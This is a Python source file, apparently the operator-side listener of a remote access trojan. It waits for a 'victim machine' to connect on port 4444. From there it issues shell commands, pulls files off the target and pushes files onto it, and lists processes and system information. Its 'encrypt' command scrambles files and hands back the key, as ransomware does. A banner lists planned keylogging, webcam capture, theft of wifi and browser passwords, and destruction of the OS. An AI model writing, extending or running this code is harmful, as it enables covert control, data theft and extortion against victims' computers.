__author__ = "Abenezer"

from Imports import *

print('''
AVALIABLE COMMANDS 
1) shutdown [ usage ] -> shutdown
2) restart  [ usage ] -> restart
3) logout   [ usage ] -> logout
4) download [ usage ] -> download + fileName
5) upload   [ usage ] -> upload + fileName
6) kill     [ usage ] -> kill chromium   -> kill + processName
7) bgps     [ usage ] -> bgps --> for listing all background processes
8) sysinfo  [ usage ] -> sysinfo --> for getting system's info
9) exit     [ usage ] -> exit --> for safely exiting the program
10) encrypt [ usage ] -> encrypt --> Commnd for encrypting directory level files
11) all system commands like cd,pwd,ls,ls -lia,cat,ifconfig,iwconfig and so on....

COMMING SOON COMMANDS 😂

1) keylogging
2) webcam
3) screenshot
4) wifipass --> command for extracting saved wifi passwords
5) chrompass --> command for extracting saved passwords from chromium browser
6) distroy  --> for completly distroying the os
7) prank
''')

class Listner:
    def __init__(self, ip, port): 
        self.listner = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Creating the Listner's socket object
        self.listner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1) # Making the socket object reusable
        self.listner.bind((ip,port)) # Binding the socket object
        self.listner.listen(3) # Making the socket object listen for an incomming connection ( 3 is the backlog number)
        
        
    def send(self,command,conn):
        """A function for sending command to the victim machine""" 
        conn.send(json.dumps(command).encode())
   
    
    def recive(self,conn):
        """A function for reciving command response from the victim machine"""
        
        json_data = ""
        
        while True:
            try:
                json_data += conn.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue
      
      
    def download(self,path,data):
        """A function for downloading a file from the victim machine"""
        
        with open(path,'wb') as file:
            file.write(base64.b64decode(data))
            
            
    def upload(self,path):
        """A function for uploading a file to the victim machine"""
        
        with open(path,'rb') as file:
            return base64.b64encode(file.read())
        
    
    
    def start(self):
        """A function for starting your listner"""
        
        print('[+] Waiting for incomming connecitons.....\n')
        conn, addr = self.listner.accept()
        print('[+] Connection has been established with IpAdress: {} and  PortNumber: {}\n'.format(addr[0],addr[1]))

        while True:
            command = input('>> ') # Taking command for execution
            self.send(command,conn)
            if command == "exit":
                conn.close()
                os.system('clear')
                exit(0)
            
            commandresult = self.recive(conn)
            if command.split()[0].lower() == "sysinfo" and len(command.split()) == 1:
                print("platform:",commandresult['platform'])
                print("platform-release:", commandresult['platform-release'])
                print("platform-version:",commandresult['platform-version'])
                print("architecture:",commandresult['architecture'])
                print("hostname:",commandresult['hostname'])
                print("ip-address:",commandresult['ip-address'])
                print("mac-address:",commandresult['mac-address'])
                print("ram:",commandresult['ram'])
            
            elif command.split()[0].lower() == "bgps" and len(command.split()) == 1:
                from pprint import prettyprinter
                pprint = prettyprinter(indent=4)
                pprint.pprint(commandresult)
                
            elif command.split()[0].lower() == 'encrypt' and len(command.split()) == 1:
                self.download("fernetkey.txt",commandresult.encode())
                print("done sir")
                
            elif command.split()[0].lower() == "decrypt" and len(command.split()) == 1:
                self.send(self.upload("fernetkey.txt").decode(),conn)
                
            elif command.split()[0].lower() == "download" and len(command.split()) > 1:
                self.download(command.split()[1],commandresult.encode())
                print("file downloaded successfully!")
                
            elif command.split()[0].lower() == "upload" and len(command.split()) > 1:
                self.send(self.upload(command.split()[1]).decode(),conn)
                print("file uploded successfully!")
                
            else:
                print(commandresult)
                
    def __str__(self):
        return "Listner"



def main():
    """The main function"""
    
    listner = listner('localhost',4444)
    listner.start()


if __name__ == "__main__":
    main()

